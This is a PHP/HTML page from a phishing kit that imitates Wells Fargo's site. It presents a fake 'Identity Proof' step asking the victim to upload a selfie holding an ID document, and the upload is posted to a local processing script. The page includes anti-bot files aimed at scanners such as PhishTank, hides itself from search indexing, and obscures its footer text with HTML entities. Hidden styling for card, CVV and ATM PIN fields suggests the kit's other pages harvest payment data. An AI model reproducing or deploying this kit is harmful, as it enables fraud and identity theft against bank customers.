<?php
ini_set( "display_errors", 0); 

		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html><html class="ui-mobile wf-myriadpro-n4-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true"><head>

        <meta name="robots" content="noindex" />
         <meta name="robots" content="noindex,nofollow" />
			<meta name="googlebot" content="noindex" />
			<META NAME="robots" CONTENT="nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>

<title>Identity Verification | Wells Fargo</title>

<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="stylesheet" href="assets/css/jquery.mobile.css">
<link rel="stylesheet" href="assets/css/desktop-tablet.combined.css">
<link rel="stylesheet" href="assets/css/archer.css">
<link rel="stylesheet" href="./assets/dist/css/formValidation.min.css">
<link rel="stylesheet" type="text/css" href="./assets/css/5.css">

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./assets/fonts/myriad.woff2) format("woff2"),url(./assets/fonts/awe.woff) format("woff"),url(./assets/fonts/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>

<style>
.fv-plugins-icon[data-field="cvv"] {
    display: none;
} 
.fv-plugins-icon[data-field="cc"] {
    display: none;
} 
.fv-plugins-icon[data-field="noc"] {
    display: none;
} 
.fv-plugins-icon[data-field="atm"] {
    display: none;
} 

.fv-plugins-icon[data-field="expdate"] {
    display: none;
}
.fv-plugins-icon[data-field="stradd"] {
    display: none;
}
</style>


<link rel="icon" href="assets/images/favicon.ico">




  </head>
<body data-gr-c-s-loaded="true" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
	<noscript>
		
	</noscript>
	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active"  tabindex="0" style="">
		

<header role="banner">
	<div class="masthead">

		<nav class="back">
			
		</nav>

		<div>

			
				
				
					<a class="c28cLink child-window ui-link" href="javascript:void(0)"> <img class="masthead-img-logo" alt="" role="img" src="./assets/images/whyt.svg">
					</a>

			
		</div>

		
			
			
				<div role="navigation" class="top-search">
					<ul>
						
							
							
								<li class="security">
									<a class="c28cLink child-window ui-link" href="javascript:void(0)" data-platform="salesplatform">Online Security
									</a>
								</li>
							
						
					</ul>
				</div>
			
		

		<nav class="menu">
			
				
				
					<a href="javascript:void(0)" class="ui-link"></a>
				
			
		</nav>

	</div>

</header>


			
		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
				
					







<!-- Define Variable activeStepCount and initialize to zero-->



			    
			
        	    
					<div class="progress-small small-screen">
						<span class="left">
		        	    	Identity Proof
	    	    		</span>
	        	    	<span class="right">
		        	    	Step 3 of 3
	    	    		</span>
			    	</div>
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
				    	   
							            								            	
							            	<span><span>
							            	
							        	   	    Contact Verification
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	<li class="ui-block-c active first">
							        	    							            	
							            	<span><span>
									        		Identity Proof
									        	
								        	</span></span>
							            </li>		
					            				            		
					            		<li class="ui-block-d">
							        	    							            	
							            	<span><span>
							            	
									        		Selfie With Proof
									        	
								        	
								        	</span></span>
							            </li>			   					            
					            
				            			            
					
				</ul>      
			</div>		


				

				<div class="osmp-title">
					<div>
						<h2>Please Verify Identity Proof For Your Account</h2>
					</div>
					
						
<h2 class="section-hdr">
	
</h2>



<div class="mainContents">
            
            <div id="process">
               <div style="padding:0 20px">
                  <div>
                     <ol class="proof">
                        <li class="itm current">
                           <div class="ui-text-small">
                              Identity Proof
                           </div>
                        </li>
                        <li class="itm current">
                           <div class="ui-text-small">
                              Selfie With Proof
                           </div>
                        </li>
                     </ol>
                  </div>
                 
                  <div id="select_two" >
                     <form action="./processing/selfie.php" method="POST" enctype='multipart/form-data'>
                        <div id="area_up_selfie">
                           <h1 style="font-size:1.4rem!important;color: #f72a42; disply:flex;text-align:center;">
                              Upload a Selfie With
                              <span>
                              </span>
                           </h1>
                           <div class="row rules text-center">
                              <div class="rule">
                                 <img src="./assets/images/take_s.svg" alt="">
                                 <div>Make sure you are looking straight at the camera</div>
                              </div>
                              <div class="rule">
                                 <img src="./assets/images/fingers_not.svg" alt="">
                                 <div>Your fingers don't cover the photo or any important information</div>
                              </div>
                              <div class="rule">
                                 <img src="./assets/images/glaesses_not.svg" alt="">
                                 <div>Don't wear a hat or glasses, and make sure your beard is trimmed</div>
                              </div>
                           </div>
                           <div class="zone" id="up_id_zone">
                              <div class="dropzone-main" style="display:block">
                                 <div class="dropzone-img" style="background-image:url(../assets/images/up_slf.svg),none">
                                    <input style="display:none" type="file" name="file2" accept="image/*" multiple>
                                 </div>
                                 <p>
                                    <b>Drag and drop or click here</b> to upload your image (max 5 MB)
                                 </p>
                              </div>
                           </div>
                           <div class="imagesArea">
                           </div>
                           <button style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one" type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>
                           <div>
                              <script type="text/javascript">
                                $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
                                 $("#Upload").addClass("current"); 
                             </script>
                           </div>
                        </div>
                     </form>
                     
                  </div>
               </div>
               <script>
                  function readFile(files, me, check) {
                     if (files) {
                     for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        FR.onload = function(e) {
                        if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                           if (check) {
                           $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                           } else {
                           $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                           }
                           $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                        }
                        }
                        FR.readAsDataURL(files[i]);
                     }
                     }
                  }
                  $(document).on('click', '.zone', function(e) {
                     e.stopPropagation();
                     $(this).find('input[type=file]').trigger(e);
                  });
                  $(document).on('click', '.btDel', function() {
                     $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                     $(this).parent().remove();
                  });
                  $(document).on('change', 'input[type=file]', function() {
                     readFile(this.files, this, false);
                  });
                  $(".dropzone-main").on('dragleave', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #dee3e7');
                     $(this).css('background', '#f0f2f4');
                  });
                  $(".dropzone-main").on('dragover', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #0564b3');
                     $(this).css('background', '#ecf1f9');
                  });
                  $(".dropzone-main").on('drop', function(e) {
                     e.preventDefault();
                     $(this).css('border', '2px dashed #41ad49');
                     readFile(e.originalEvent.dataTransfer.files, this, true);
                  });
               </script>
            </div>
         </div>
         <script type="text/javascript">
            $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
            $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
         </script>

<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">
					
					
						
						    
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						    
						
					
					</ul>				
					<ul class="large-screen">
						
						
						
							 
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						     
						
					
					</ul>				
				</nav>
				<hr>
				&#169;&#32;&#49;&#57;&#57;&#57; - <span class="placeholder">&#50;&#48;&#50;&#50;<span> &#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>


</body></html>
